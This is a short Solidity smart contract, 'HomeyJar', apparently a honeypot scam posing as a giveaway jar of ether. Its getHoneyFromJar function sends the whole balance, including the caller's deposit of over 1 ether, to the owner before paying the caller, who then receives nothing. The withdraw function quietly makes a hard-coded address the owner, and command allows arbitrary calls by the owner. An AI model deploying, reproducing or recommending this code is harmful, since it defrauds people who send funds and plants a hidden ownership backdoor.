pragma solidity ^0.4.19;

contract HomeyJar {
    address public owner = msg.sender;

    function() public payable {}

    function getHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
            owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
        }
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}